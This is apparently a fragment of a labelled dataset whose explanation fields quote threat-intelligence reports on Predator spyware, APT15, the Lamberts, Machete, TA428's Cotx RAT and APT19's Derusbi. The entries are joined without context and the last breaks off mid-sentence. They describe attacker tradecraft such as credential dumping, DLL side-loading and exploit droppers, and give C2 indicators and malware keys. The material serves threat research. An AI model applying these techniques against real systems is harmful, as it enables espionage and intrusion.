sophisticated spyware and digital attacks outlined in this report are used to target individuals who are of particular interest to government spyware operators because of their professional background, civil society work or information they possess. If you believe that you are at heightened risk of such attacks, there are practical steps you can take to make these kinds of advanced digital attacks more difficult: Always update your web browser and mobile operating system software as soon as any security updates are made available for your devices. Enable the enhanced security “Lockdown Mode” if you use an Apple device. This can make a successful compromise of your device significantly more challenging for an attacker. Using a reputable VPN provider can provide more privacy against surveillance from your ISP or government and prevent network injection attacks from those entities. A VPN will also make traffic correlation attacks – especially those targeting messaging apps – more difficult to perform and less effective. Features such as Signal’s optional ‘Relay Call’ mode can help hide revealing metadata, such as the IP address and location of the person you are calling from your ISP or government. In some situations, making or receiving calls from certain countries can expose the individual to heighten risks. A reputable VPN can also help mitigate these risks. Those with particular concerns about their devices being compromised can take actions to mitigate the extent of exposure including using “disappearing messages” where available and restarting their devices regularly which can remove non-persistent spyware infections. If you receive a state-sponsored attacker warning you should seek expert help to understand any ongoing risks for your accounts or devices. If you are a human rights defender, journalist, or member of civil society and believe you have been targeted by this campaign or have received similar attack links through social media, please get in touch with the Security Lab at securitylab.amnesty.org.This glossary is a non-exhaustive list of products and marketing names which have been used by Intellexa or Intellexa alliance entities. This has been compiled based on previously published research, as cited above, plus analysis of Intellexa alliance brochures as part of the Predator Files. We are not able to confirm if the actual performance of the products matches the descriptions in promotional materials.The Intellexa alliance, its subsidiaries and partnerships have evolved over time since its inception into a complex worldwide company structure. For readability purposes, both EIC and Amnesty International use the following breakdown: Nexa group – Nexa Technologies (France), Nexa Technologies CZ s.r.o (Czech Republic), Advanced Middle East Systems (United Arab Emirates), Trovicor fz (United Arab Emirates). Intellexa group – Wispear/Passitora (Cyprus), Cytrox (North Macedonia), Cytrox Holdings Zrt (Hungary), Intellexa S.A (Greece), Intellexa Ltd (Ireland), Thalestris Ltd (Ireland). Intellexa alliance – is a technological and commercial alliance concluded in 2019 between the Intellexa group and the Nexa group. The two groups of companies maintained a separate shareholding. In the press release announcing the birth of the alliance, the member companies were Nexa Technologies, Advanced Middle East Systems, Cytrox, WiSpear and Senpai Technologies.9 It is unclear whether the alliance between the Nexa group and the Intellexa group is still active today. The Intellexa group of companies was founded in 2018 by the former Israeli army officer Tal Dilian and several of his associates, which sells the Predator spyware. Since 2020, it has been controlled by the holding company Thalestris, which is based in Ireland. The Intellexa group’s main companies are Cytrox (North Macedonia), which develops the Predator spyware system, WiSpear (Cyprus), specialist in Wi-Fi interception, and Senpai Technologies (Israel), a specialist in open-source intelligence and the creation of virtual avatars. The Nexa group of companies, which mainly operated from France, specialized in traffic interception and mass surveillance systems (IP, voice, satellite, IMSI catchers, big data analysis). The group was created in 2012 to take over the surveillance business of the French company Amesys. It included from the start, Nexa Technologies (France) and Advanced Middle East Systems (Dubai), a sister company used by Nexa as a sales office. Between 2019 and 2022, the companies of the Nexa group were controlled by the holding company Boss Industries (France). In 2019, Boss Industries purchased the company Trovicor (Dubai), which specializes in “lawful interception” (telephone monitoring systems). In 2020, the Nexa group decided to abandon Nexa Technologies as a brand and began to operate under the commercial name Trovicor Intelligence. In 2022 Nexa Technologies sold its assets to the French company ChapsVision, and in 2023 changed its name to RB 42 and announced that it had ceased its activities in the surveillance business. Boss Industries is still the owner of Trovicor, according to public documents. Cytrox, is a North Macedonian company established in 2017 which was the original creator of the Predator spyware and was acquired by WiSpear in 2018. Amesys, based in France, was a telecom and defence company, which created a mass-monitoring system called Eagle, capable of performing mass surveillance of internet (IP) traffic at the scale of a whole country. Amesys ceased its activities in the cybersurveillance business in 2012, after the transfer of its assets to Nexa Technologies, which renamed Eagle as Cerebro.\n\n\n",

However, in recent years, ethical and legal questions have swirled around the use of these surveillance tools, which have become known in the security community as “mercenary spyware.”Intellexa’s spyware products, like most recently exposed spyware tools, have multiple components that can be grouped into three major buckets aligned with consecutive stages of the attack:The first two — exploitation and privilege escalation — are often grouped in exploit chains, which start by exploiting a remote vulnerability to obtain remote code execution (RCE) privileges, followed by mitigation circumvention and privilege escalation, since the vulnerable processes are often less privileged. New analysis from Talos uncovered the inner workings of PREDATOR and the mechanisms it uses to communicate with the other spyware component deployed along with it known as “ALIEN.”PREDATOR is an interesting piece of mercenary spyware that has been around since at least 2019, designed to be flexible so that new Python-based modules can be delivered without the need for repeated exploitation, thus making it especially versatile and dangerous.

        "claim": "During our analysis of the compromise, we identified new backdoors, RoyalCli and RoyalDNS, as part of APT15's evolving toolset, revealing their sophisticated techniques in maintaining persistence, evading detection, and targeting sensitive UK government and military information.",
        "original_label": "true",
        "label": "true",
        "explain": "A number of sensitive documents were stolen by the attackers during the incident and we believe APT15 was targeting information related to UK government departments and military technology. During our analysis of the compromise, we identified new backdoors that now appear to be part of APT15's toolset. The backdoor BS2005 - which has traditionally been used by the group - now appears alongside the additional backdoors RoyalCli and RoyalDNS. The RoyalCli backdoor appears to be an evolution of BS2005 and uses familiar encryption and encoding routines. The name RoyalCli was chosen by us due to a debugging path left in the binary: c:\\users\\wizard\\documents\\visual studio 2010\\Projects\\RoyalCli\\Release\\RoyalCli.pdb RoyalCli and BS2005 both communicate with the attacker's command and control (C2) through Internet Explorer (IE) by using the COM interface IWebBrowser2. Due to the nature of the technique, this results in C2 data being cached to disk by the IE process; we'll get to this later. Analysis of the domains and IP address infrastructure used by APT15 identified a number of similar possible domains, shown at the bottom of the post. These appeared to be hosted on either Linode or Google Cloud, with a preference for using the ASN AS63949. All of the backdoors identified - excluding RoyalDNS - required APT15 to create batch scripts in order to install its persistence mechanism. This was achieved through the use of a simple Windows run key. We believe that APT15 could have employed this technique in order to evade behavioural detection, rather than due to a lack of sophistication or development capability. Additional tools were recovered during the incident, including a network scanning/enumeration tool, the archiving tool WinRAR and a bespoke Microsoft SharePoint enumeration and data dumping tool, known as 'spwebmember'. spwebmember was written in Microsoft .NET and includes hardcoded values for client project names for data extraction. The tool would connect to the SQL SharePoint database and issue a query to dump all data from the database to a temporary file affixed with 'spdata'. The group also used keyloggers and their own .NET tool to enumerate folders and dump data from Microsoft Exchange mailboxes. APT15 was also observed using Mimikatz to dump credentials and generate Kerberos golden tickets. This allowed the group to persist in the victim's network in the event of remediation actions being undertaken, such as a password reset. Upon ejection from the network, APT15 managed to regain access a couple of weeks later via the corporate VPN solution with a stolen VPN certificate, which they had extracted from a compromised host. This time, APT15 opted for a DNS based backdoor: RoyalDNS. The persistence mechanism used by RoyalDNS was achieved through a service called 'Nwsapagent'. C2 of this backdoor was performed using the TXT record of the DNS protocol. C2 was communicating with the domain 'andspurs[.]com'. We mentioned earlier that due to the nature of the IE injection technique used by the HTTP-based backdoors, a number of C2 commands were cached to disk. We were able to recover these files and reverse engineer the encoding routine used by the backdoors in order to uncover the exact commands executed by the attacker. In total, we were able to recover more than 200 commands executed by the attacker against the compromised hosts and were able to gain a clear insight into the attacker's TTPs. Our decode scripts can be found on our Github page: https://github.com/nccgroup/Royal_APT (https://github.com/nccgroup/Royal_APT) Analysis of the commands executed by APT15 reaffirmed the group's preference to 'live off the land'. They utilised Windows commands in order to enumerate and conduct reconnaissance activities such as tasklist.exe, ping.exe, netstat.exe, net.exe, systeminfo.exe, ipconfig.exe and bcp.exe. Lateral movement was conducted through by a combination of net command, mounting the C$ share of hosts and manually copying files to or from compromised hosts. APT15 then used a tool known as RemoteExec (similar to Microsoft's Psexec) in order to remotely execute batch scripts and binaries. During our analysis of the decoded attacker commands we noticed a typographical mistake, shown below in the folder name 'systme'. This indicates that a human operative was executing commands on a command line style interface, rather than an automated or GUI process.\n\n\n",

DLL hijacking techniques have been seen in the past with the APT15 group. If you read the report mentioned above about RoyalAPT by NCC Group, it is mentioned that APT15 infiltrated an organization again after stealing a VPN private key, therefore we can assume this version was tailor made to an organization they have already infiltrated and are connecting to the internal network using a VPN.The rest of MirageFox functions similarly to previous malware created by APT15, first collecting information about the computer like the username, CPU information, architecture, and so forth.",

        "explain": "Yesterday, our colleagues from Symantec published their analysis of Longhorn, an advanced threat actor that can be easily compared with Regin, ProjectSauron, Equation or Duqu2 in terms of its complexity. Longhorn, which we internally refer to as “The Lamberts”, first came to the attention of the ITSec community in 2014, when our colleagues from FireEye discovered an attack using a zero day vulnerability (CVE-2014-4148). The attack leveraged malware we called ‘BlackLambert’, which was used to target a high profile organization in Europe. Since at least 2008, The Lamberts have used multiple sophisticated attack tools against high-profile victims. Their arsenal includes network-driven backdoors, several generations of modular backdoors, harvesting tools, and wipers. Versions for both Windows and OSX are known at this time, with the latest samples created in 2016. Although the operational security displayed by actors using the Lamberts toolkit is very good, one sample includes a PDB path that points to a project named “Archan~1” (perhaps ‘Archangel’). The root folder on the PDB path is named “Hudson”. This is one of the very few mistakes we’ve seen with this threat actor. While in most cases the infection vector remains unknown, the high profile attack from 2014 used a very complex Windows TTF zero-day exploit (CVE-2014-4148). Kaspersky Lab products successfully detect and eradicate all the known malware from the Lamberts family. The first time the Lambert family malware was uncovered publicly was in October 2014, when FireEye posted a blog about a zero day exploit (CVE-2014-4148) used in the wild. The vulnerability was patched by Microsoft at the same time. We named the malware involved ‘Black Lambert’ and described it thoroughly in a private report, available to Kaspersky APT Intel Reports subscribers. The authors of Black Lambert included a couple of very interesting details in the sample, which read as the following: toolType=wl, build=132914, versionName = 2.0.0. Looking for similar samples, we were able to identify another generation of related tools which we called White Lambert. While Black Lambert connects directly to its C&C for instructions, White Lambert is a fully passive, network-driven backdoor.White Lambert runs in kernel mode and intercepts network traffic on infected machines. It decrypts packets crafted in a special format to extract instructions. We named these passive backdoors ‘White Lambert’ to contrast with the active “Black Lambert” implants. Looking further for any other malware related to White Lambert and Black Lambert, we came by another generation of malware that we called Blue Lambert. One of the Blue Lambert samples is interesting because it appears to have been used as second stage malware in a high profile attack, which involved the Black Lambert malware. Looking further for malware similar to Blue Lambert, we came by another family of malware we called Green Lambert. Green Lambert is a lighter, more reliable, but older version of Blue Lambert. Interestingly, while most Blue Lambert variants have version numbers in the range of 2.x, Green Lambert is mostly in 3.x versions. This stands in opposition to the data gathered from export timestamps and C&C domain activity that points to Green Lambert being considerably older than the Blue variant. Perhaps both Blue and Green Lamberts have been developed in parallel by two different teams working under the same umbrella, as normal software version iterations, with one seeing earlier deployment than the other. Signatures created for Green Lambert (Windows) have also triggered on an OS X variant of Green Lambert, with a very low version number: 1.2.0. This was uploaded to a multiscanner service in September 2014. The OS X variant of Green Lambert is in many regards functionally identical to the Windows version, however it misses certain functionality such as running plugins directly in memory. Kaspersky Lab detections for Blue, Black, and Green Lamberts have been triggered by a relatively small set of victims from around the world. While investigating one of these infections involving White Lambert (network-driven implant) and Blue Lambert (active implant), we found yet another family of tools that appear to be related. We called this new family Pink Lambert. The Pink Lambert toolset includes a beaconing implant, a USB-harvesting module and a multi-platform orchestrator framework which can be used to create OS-independent malware. Versions of this particular orchestrator were found on other victims, together with White Lambert samples, indicating a close relationship between the White and Pink Lambert malware families. By looking further for other undetected malware on victims of White Lambert, we found yet another apparently related family. The new family, which we called Gray Lambert is the latest iteration of the passive network tools from the Lamberts’ arsenal. The coding style of Gray Lambert is similar to the Pink Lambert USB-harvesting module, however, the functionality mirrors that of White Lambert. Compared to White Lambert, Gray Lambert runs in user mode, without the need for exploiting a vulnerable signed driver to load arbitrary code on 64-bit Windows variants. Connecting all these different families by shared code, data formats, C&C servers, and victims, we have arrived at the following overarching picture:Below, we provide a small summary of all the Lamberts. A full description of all variants is available to subscribers of Kaspersky APT Reports.The only known sample of Black Lambert was dropped by a TTF-exploit zero day (CVE-2014-4148). Its internal configuration included a proxy server which suggests the malware was created to work in a very specific network configuration, inside the victim’s network. An internal description of Black Lambert indicates what appears to be a set of markers used by the attackers to denote this particular branch: toolType=wl, build=132914, versionName = 2.0.0.The Blue Lambert implants contain what appear to be version numbers in the 2.x range, together with project/operation codename sets, which may also indicate codenames for the victims or campaigns.Known codenames include TRUE CRIME (2.2.0.2), CERVELO YARDBIRD (2.6.1.1), GAI SHU (2.2.0.5), DOUBLESIDED SCOOBYSNACK (2.3.0.2), FUNNELCAKE CARNIVAL (2.5.0.2), PROSPER SPOCK (2.0.0.2), RINGTOSS CARNIVAL (2.4.2.2), COD FISH (2.2.0.0), and INVERTED SHOT (2.6.2.3).Green Lambert is a family of tools deeply related to Blue Lambert. The functionality is very similar, both Blue and Green are active implants. The configuration data shares the same style of codenames for victims, operations, or projects.The Green Lambert family is the only one where non-Windows variants have been found. An old version of Green Lambert, compiled for OS X was uploaded from Russia to a multiscanner service in 2014. Its internal codename is HO BO (1.2.0). The Windows versions of Green Lambert have the following code names: BEARD BLUE (2.7.1), GORDON FLASH (3.0), APE ESCAPE (3.0.2), SPOCK LOGICAL (3.0.2), PIZZA ASSAULT (3.0.5), and SNOW BLOWER (3.0.5). Interestingly, one of the droppers of Green Lambert abused an ICS software package named “Subway Environmental Simulation Program” or “SES”, which has been available on certain forums visited by engineers working with industrial software. Similar techniques have been observed in the past from other threat groups, for instance, trojanized Oracle installers by the Equation group.White Lambert is a family of tools that share the same internal description as Black Lambert. Known tool types, builds, and version names include: ToolType “aa”, protocol 3, version 7, versionName 5.0.2, build 113140 ToolType “aa”, protocol 3, version 7, versionName 5.0.0, build 113140 ToolType “aa”, protocol 3, version 6, versionName 4.2.0, build 110836M ToolType “aa”, protocol 3, version 5, versionName 3.2.0 One of the White Lambert samples is interesting because it has a forgotten PDB path inside, which points to “Archan~1l” and “Hudson”. Hudson could point to a project name, if the authors name their projects by rivers in the US, or, it could also be the developer’s first name. The truncated (8.3) path “archan~1” most likely means “Archangel”. The tool type “aa” could also suggest “ArchAngel”. By comparison, the Black Lambert tool type “wl” has no known meaning.White Lambert samples run in kernel mode and sniff network traffic looking for special packets containing instructions to execute. To run unsigned code in kernel mode on 64-bit Windows, White Lambert uses an exploit against a signed, legitimate SiSoftware Sandra driver. The same method was used before by Turla, ProjectSauron, and Equation’s Grayfish, with other known, legitimate drivers.Pink Lambert is a suite of tools initially discovered on a White Lambert victim. It includes a beaconing implant, partially based on publicly available source code. The source code on top of which Pink Lambert’s beaconing implant was created is “A Fully Featured Windows HTTP Wrapper in C++”.Other tools in the Pink Lambert suite include USB stealer modules and a very complex multi-platform orchestrator. In a second incident, a Pink Lambert orchestrator was found on another White Lambert victim, substantiating the connection between the Pink and White Lamberts.Gray Lambert is the most recent tool in the Lamberts’ arsenal. It is a network-driven backdoor, similar in functionality to White Lambert. Unlike White Lambert, which runs in kernel mode, Gray Lambert is a user-mode implant. The compilation and coding style of Gray Lambert is similar to the Pink Lambert USB stealers. Gray Lambert initially appeared on the computers of victims infected by White Lambert, which could suggest the authors were upgrading White Lambert infections to Gray. This migration activity was last observed in October 2016. Some of the known filenames for Gray Lambert are mwapi32.dll and poolstr.dll – it should be pointed though that the filenames used by the Lamberts are generally unique and have never been used twice.Most of the Blue and Green Lambert samples have two C&C servers hardcoded in their configuration block: a hostname and an IP address. Using our own pDNS as well as DomainTools IP history, we plotted the times when the C&C servers were active and pointing to the same IP address as the one from the configuration block. Unfortunately, this method doesn’t work for all samples, since some of them don’t have a domain for C&C. Additionally, in some cases we couldn’t find any pDNS information for the hostname configured in the malware. Luckily, the attackers have made a few mistakes, which allow us to identify the activity times for most of the other samples. For instance, in case when no pDNS information was available for a subdomain on top of the main C&C domain, the domain registration dates were sufficient to point out when the activity began. Additionally, in some cases the top domain pointed to the same IP address as the one from the configuration file, allowing us to identify the activity times. Another worthwhile analysis method focuses on the set of Blue Lambert samples that have exports. Although most compilation timestamps in the PE header appear to have been tampered (to reflect a 2003-2004 range), the authors forgot to alter the timestamps in the export section. This allowed us to identify not just the activity / compilation timestamps, but also the method used for faking the compilation timestamps in the PE header. It seems the algorithm used to tamper with the samples was the following: subtract 0x10 from the highest byte of timestamp (which amounts to about 8 and half years) and then randomize the lowest 3 bytes. This way we conclude that for Blue Lamberts, that original compilation time of samples was in the range of 2012-2015. Putting together all the various families, with recovered activity times, we come to the following picture:As it can be seen from the chart above, Green Lambert is the oldest and longest-running in the family, while Gray is the newest. White, Blue and Pink somehow overlap in deployment, with Blue replacing Green Lambert. Black Lambert was seen only briefly and we assume it was “retired” from the arsenal after being discovered by FireEye in 2014.The threat group(s) behind the Lambert toolkits have used a large number of codenames extensively throughout their projects. Some of these codenames are references to old computer games, Star Trek, and cartoons, which is very unusual for high profile APT groups. We really enjoyed going through the backstories of these codenames and wanted to provide them below for others to enjoy as well. For instance, one of the Green Lambert versions has the internal codename “GORDON FLASH”, which can also be read as “FLASH GORDON”. Flash Gordon is the hero of a space opera adventure comic strip created by and originally drawn by Alex Raymond. It was first published in 1934 and subsequently turned into a popular film in 1980.A ‘Funnel cake’ is a regional food popular in North America at carnivals, fairs, sporting events, and seaside resorts. This explains the codename “FUNNELCAKE CARNIVAL”:Spock and Prosper obviously refers to Star Trek, the well-known science fiction television series created by Gene Roddenberry. Cdr. Spock is a half-Vulcan, half-human character, portrayed by Leonard Nimoy. “Live long and prosper” is the traditional Vulcan greeting in the series.DOUBLESIDED SCOOBYSNACK is likely a reference to an NFL Lip Reading video featuring Adrian Peterson that went viral in mid-2013. According to the urban dictionary, it is also used to denote a sexual game in which the participants are dressed as Scooby-Doo and his master. Ape Escape (also known as Saru Get You (サルゲッチュ Saru Getchu) in Japan) is a series of video games made by SCE Japan Studio, starting with Ape Escape for PlayStation in 1999. The series often incorporates ape-related humor, unique gameplay, and a wide variety of pop culture references; it is also notable for being the first game to make the DualShock or Dual Analog controller mandatory.INVERTED SHOT is likely a reference to a mixed martial arts move also known as an ‘Imanari roll takedown’, named after Masakazu Imanari who popularized the grappling technique. It consists of a modified Brazilian jiu-jitsu granby roll that places the fighter in inverted guard position while taking the opponent down to the mat. GAI and SHU (as used in Green Lambert OS X) are characters from the Guilty Crown anime series. Gai Tsutsugami (恙神 涯 Tsutsugami Gai) is the 17-year-old resourceful and charismatic leader of the “Funeral Parlor” resistance group, while Shu Ouma (桜満 集 Ōma Shū) is the 17-year-old main protagonist of Guilty Crown.The Lamberts toolkit spans across several years, with most activity occurring in 2013 and 2014. Overall, the toolkit includes highly sophisticated malware, which relies on high-level techniques to sniff network traffic, run plugins in memory without touching the disk, and leverages exploits against signed drivers to run unsigned code on 64-bit Windows. To further exemplify the proficiency of the attackers leveraging the Lamberts toolkit, deployment of Black Lambert included a rather sophisticated TTF zero day exploit, CVE-2014-4148. Taking that into account, we classify the Lamberts as the same level of complexity as Regin, ProjectSauron, Equation and Duqu2, which makes them one of the most sophisticated cyber espionage toolkits we have ever analysed. Considering the complexity of these projects and the existence of an implant for OS X, we assume that it is highly possible that other Lamberts also exist for other platforms, such as Linux. The fact that in the vast majority of cases the infection method is unknown probably means there are still a lot of unknown details about these attacks and the group(s) leveraging them. As usual, defense against attacks such as those from the Lamberts/Longhorn should include a multi-layered approach. Kaspersky products include special mitigation strategies against the malware used by this group, as well as the many other APT groups we track. If you are interested in reading more about effective mitigation strategies in general, we recommend the following articles: Strategies for mitigating APTs How to mitigate 85% of threats with four strategies We will continue tracking the Lamberts and sharing new findings with our intel report subscribers, as well as with the general public. If you would like to be the first to hear our news, we suggest you subscribe to our intel reports. Kaspersky Lab products successfully detect and eradicate all the known malware from the Lamberts family.\n\n\n",

        "explain": "Some time ago, a Kaspersky Lab customer in Latin America contacted us to say he had visited China and suspected his machine was infected with an unknown, undetected malware. While assisting the customer, we found a very interesting file in the system that is completely unrelated to China and contained no Chinese coding traces. At first look, it pretends to be a Java related application but after a quick analysis, it was obvious this was something more than just a simple Java file. It was a targeted attack we are calling “Machete”.“Machete” is a targeted attack campaign with Spanish speaking roots. We believe this campaign started in 2010 and was renewed with an improved infrastructure in 2012. The operation may be still “active”. The malware is capable of the following cyber-espionage operations: Logging keystrokes Capturing audio from the computer’s microphone Capturing screenshots Capturing geolocation data Taking photos from the computer’s web camera Copying files to a remote server Copying files to a special USB device if inserted Hijjacking the clipboard and capturing information from the target machine.Most of the victims are located in, Venezuela, Ecuador, Colombia, Peru, Russia, Cuba, and Spain, among others. In some cases, such as Russia, the target appears to be an embassy from one of the countries of this list. Targets include high-level profiles, including intelligence services, military, embassies and government institutions.The malware is distributed via social engineering techniques, which includes spear-phishing emails and infections via Web by a fake Blog website. We have found no evidence of of exploits targeting zero-day vulnerabilities. Both the attackers and the victims appear to be Spanish-speaking. During this investigation, we also discovered many other the files installing this cyber-espionage tool in what appears to be a dedicated a spear phishing campaign. These files display a PowerPoint presentation that installs the malware on the target system once the file is opened. These are the names of the PowerPoint attachments: Hermosa XXX.pps.rar Suntzu.rar El arte de la guerra.rar Hot brazilian XXX.rar These files are in reality Nullsoft Installer self-extracting archives and have compilation dates going back to 2008. A consequence of the embedded Python code inside the executables is that these installers include all the necessary Python libraries as well as the PowerPoint file shown to the victim during the installation. The result is extremely large files, over 3MB.A technical relevant fact about this campaign is the use of Python embedded into Windows executables of the malware. This is very unusual and does not have any advantage for the attackers except ease of coding. There is no multi-platform support as the code is heavily Windows-oriented (use of libraries). However, we discovered several clues that the attackers prepared the infrastructure for Mac OS X and Unix victims as well. In addition to Windows components, we also found a mobile (Android) component. Both attackers and victims speak Spanish natively, as we see it consistently in the source code of the client side and in the Python code.The following are domains found during the infection campaign. Any communication with them must be considered extremely suspicious.The “Machete” discovery shows there are many regional players in the world of targeted attacks. Unfortunately, such attacks became a part of the cyber arsenal of many nations located over the world. We can be sure there are other parallel targeted attacks running now in Latin America and other regions. Kaspersky Lab products detect malicious samples related to this targeted attack as Trojan-Spy.Python.Ragua.\n\n\n",

        "label": "true",
        "explain": "Proofpoint researchers have identified a targeted APT campaign that utilized malicious RTF documents to deliver custom malware to unsuspecting victims. We dubbed this campaign “Operation LagTime IT” based on entities that were targeted and the distinctive domains registered to C&C IP infrastructure. Beginning in early 2019, these threat actors targeted a number of government agencies in East Asia overseeing government information technology, domestic affairs, foreign affairs, economic development, and political processes. We determined that the infection vector observed in this campaign was spear phishing, with emails originating from both free email accounts and compromised user accounts. Attackers relied on Microsoft Equation Editor exploit CVE-2018-0798 to deliver a custom malware that Proofpoint researchers have dubbed Cotx RAT. Additionally, this APT group utilizes Poison Ivy payloads that share overlapping command and control (C&C) infrastructure with the newly identified Cotx campaigns. Based on infrastructure overlaps, post-exploitation techniques, and historic TTPs utilized in this operation, Proofpoint analysts attribute this activity to the Chinese APT group tracked internally as TA428. Researchers believe that this activity has an operational and tactical resemblance to the Maudi Surveillance Operation which was previously reported in 2013 [1].Proofpoint researchers initially identified email campaigns with malicious RTF document attachments targeting East Asian government agencies in March 2019. These campaigns originated from adversary-operated free email sender accounts at yahoo[.]co[.].jp and yahoo[.]com. Sender addresses often imitated common names found in the languages of targeted entities. Spear phishing emails included malicious .doc attachments that were actually RTF files saved with .doc file extensions. The lures used in the subjects, attachment names, and attachment content in several cases utilized information technology themes specific to Asia such as governmental or public training documents relating to IT. On one specific occasion an email utilized the subject “ITU Asia-Pacific Online CoE Training Course on ‘Conformity & Interoperability in 5G’ for the Asia-Pacific Region, 15-26 April 2019” and the attachment name “190315_annex 1 online_course_agenda_coei_c&i.doc”. The conference referenced in the lure was an actual event likely selected due to its relevance to potential victims. This is significant as countries in the APAC region continue to adopt Chinese 5G technology in government as well as heavy equipment industries.We identified several government agencies targeted as part of Operation LagTime IT. These agencies are responsible for overseeing IT, scientific research, domestic affairs, foreign affairs, political processes, and financial development.As we previously noted, the malicious RTF attachments exploited vulnerabilities in the Microsoft Equation Editor, specifically CVE-2018-0798, before downloading subsequent payloads. The exploit uses an encoded RTF object to drop a PE file to the Windows temporary directory. The dropped PE file has the distinctive file name “8.t”. When executed, writes a Word Add-In file with the “.wll” extension to the Windows Startup directory, which runs the next time Word is opened. It should be noted that this dropper methodology is not unique to TA428, and has been identified by security researchers in campaigns related to at least four additional Chinese APT groups. RTF files leveraging this technique have historically contained the string “objw871\\objh811\\objscalex8\\objscaley8” which has been noted by researchers at Anomali [2] and FireEye. Researchers have also recently observed this RTF weaponizer tool in commodity campaigns delivering Async RAT. After it is executed, the .wll file renames itself as RasTls.dll. Simultaneously, it decrypts a legitimate Symantec PE binary commonly named IntelGraphicsController.exe or AcroRd32.exe. This legitimate Symantec binary is used to side-load RasTls.dll using DLL search-order hijacking leading to the execution of Cotx RAT malware. Once executed the RasTls.dll file next resolves the addresses of the DLL libraries it is programmed to access and ensures that it is only running in one of five predetermined processes. These processes are winword.exe, excel.exe, powerpnt.exe, eqnedt32.exe, and acrord32.exe. The first four of these processes are associated with Microsoft Word, Excel, and PowerPoint exploits, as well as the Equation Editor exploit used by the initial malicious RTF in this campaign. The last process is utilized as part of the loading process for Cotx RAT and involves the legitimate Symantec binary noted above. The inclusion of the processes excel.exe and powerpnt.exe suggests that this stage one malware may be capable of utilizing .xls and .ppsx files as droppers. Researchers at SectorB06 [4] have noted this stage-one payload and indicated that throughout the above process it is running a “CheckRemoteDebuggerPresent” function to prevent analysis and debugging by researchers.The RasTls.dll contains the Cotx RAT code. The malware is written in C++ using object-oriented programming. We named it by borrowing the name of the location of its stored configuration. The encrypted configuration is stored in the side-loaded DLL file RasTls.dll in a PE section named “.cotx”. The current encrypted configuration is also stored in the registry key “HKEY_LOCAL_MACHINE\\SOFTWARE\\Intel\\Java\\user”. The configuration data is AES-192-encrypted using CBC mode and base64-encoded. We determined that the encryption key was “98151137ab12780969b2c3612072018709a83a3352466a8b” (hex-encoded) and the initialization vector “IV” was “2042123224315117031b1a0a3ccda53f” (hex-encoded). In plaintext the configuration appears as follows:The first four bytes contain the size of the configuration (42-bytes). The configuration is pipe delimited and contains: For persistence, Cotx stores files in a directory “Intel\\Intel(R) Processor Graphics”. The location of this folder varies among samples with both the %AppData% and %PROGRAMFILES% directories being observed. The command and control structure of Cotx RAT is proxy aware. It utilizes wolfSSL for TLS encrypted communication. The initial beacon contains “|”-delimited system information. The data included in the beacon is Zlib compressed and encrypted with AES-192 in CBC mode utilizing the same keys as the configuration. The following values are included: Commands from the C&C are received from the malware beacon. This data is AES-encrypted. We observed the following commands: TA428 threat actors also delivered Poison Ivy malware payloads. In a limited number of cases, we observed attachments utilizing the 8.t dropper methodology described above. However, the majority of Poison Ivy payloads were dropped as PE files named OSE.exe when the RTF attachment was executed and an Equation Editor vulnerability was successfully exploited. The Poison Ivy samples all communicated with the IP 95.179.131[.]29. We identified earlier variants of Poison Ivy malware that utilized the above IP via open source research, which used the file names bubbles.exe and sfx.exe. Examination of the Poison Ivy malware configurations indicated that all samples shared the password “3&U<9f*lZ>!MIQ” while campaign and group IDs, as well as mutexes varied across campaigns. We identified significant operational overlap between Cotx RAT campaigns and Poison Ivy campaigns. Specifically, on several occasions users that were unsuccessfully targeted with Cotx RAT malware were later targeted with messages distributing Poison Ivy. Users were also targeted by Poison Ivy malware on successive occasions indicating the adversary’s persistent nature in attempting to compromise targets via spear phishing. In one example, a targeted user received an unsuccessful phishing email attempting to deliver Cotx RAT followed by a Poison Ivy phishing email seven days later. In addition to a shared targeting list, analysts observed adversary reuse of free email sender accounts to deliver both Cotx RAT and Poison Ivy malware to different users. It appears the adversary sender accounts utilized delivery TTPs and payloads interchangeably from March through April 2019. This vacillation of tactics further enforces Proofpoint’s classification of these campaigns under a single operation.An examination of the separate C&C infrastructure utilized by Cotx RAT and Poison Ivy payloads revealed further overlaps between these campaigns. A review of passive DNS information indicated that the C&C IPs hosted subdomains that share the root domain vzglagtime[.]net. We found that the Poison Ivy C&C IP hosted the domains An examination of the separate C&C infrastructure utilized by Cotx RAT and Poison Ivy payloads revealed further overlaps between these campaigns. A review of passive DNS information indicated that the C&C IPs hosted subdomains that share the root domain vzglagtime[.]net. We found that the Poison Ivy C&C IP hosted the domains f1news[.]vzglagtime[.]net and news[.]vzglagtime[.]net. The Cotx RAT C&C IP hosted the hostname mtanews.vzglagtime[.]net. The latter of these domains was previously reported by security researchers to have been a C&C address observed in a malware implant targeting the East Asian Telecommunications and Transportation sectors in January 2019. The presence of related domain registrations on disparate malware IP infrastructure also contributed to analysts’ decision to classify these campaigns collectively under Operation LagTime IT.Proofpoint analysts assess that Operation LagTime IT is likely a continuation of targeted activity by APT actors aligned with Chinese state interests. This operation, centered around East Asian governmental agencies, may represent efforts to satisfy espionage and intelligence requirements relative to China’s regional neighbors. While not revolutionary in its approach or malware design, TA428 actors demonstrated significant persistence in compromising victims and utilized custom malware. The defined scope of targeting in this operation including government information technology agencies demonstrates a focus on high-value targets. While ultimately the motivation for this APT campaign remains opaque, what is certain is that TA428 persists in targeting users responsible for the orchestration of governmental systems in East Asia.\n\n\n",

        "explain": "In this blog post we’re presenting a full analysis of a DLL backdoor also reported publicly as Derusbi. This particular piece of malware is associated with the actor known as APT19 (Codoso, C0d0so, Sunshop Group). APT19, also known as C0d0so or Deep Panda, is allegedly a Chinese-based threat group that targeted a lot of industries in the past. FireEye reported that APT19 was active in 2017 when they used 3 different methods to compromise targets: CVE-2017-0199 vulnerability, macro-enabled Microsoft Excel (XLSM) documents and an application whitelisting bypass to the XLSM documents. The malware registers itself as a service if it has run with administrator privileges, otherwise, it establishes persistence via the “Run” registry key. The main purpose of the malicious DLL is to gather information about the victim’s environment such as username, hostname, IP address of the host, the CPU architecture, the default language for the local system, the amount of physical memory, the amount of physical memory currently available, the processor name, the width and the height of the screen of the primary display monitor. The exfiltrated data is encrypted using a XOR operation (the 1-byte key seems to be randomly-chosen), and then encoded using the Base64 algorithm. There is a lot of network communication performed by the malware, however, due to the fact that the C2 server seems to be sinkholed now, we were not able to retrieve the file that was intended to be downloaded by the process.DebugCreate and DebugConnect entries have the same address and represent the starting point of the malicious activity. The process computes a random string of 3 characters using GetTickCount API calls and the algorithm shown in figure 2:It tries to delete a file/directory called <3 random chars generated earlier>.dll from System32 directory as shown below:Because the file doesn’t exist at this time, it’s created using CreateFileA API and then deleted using DeleteFileA API. This technique is 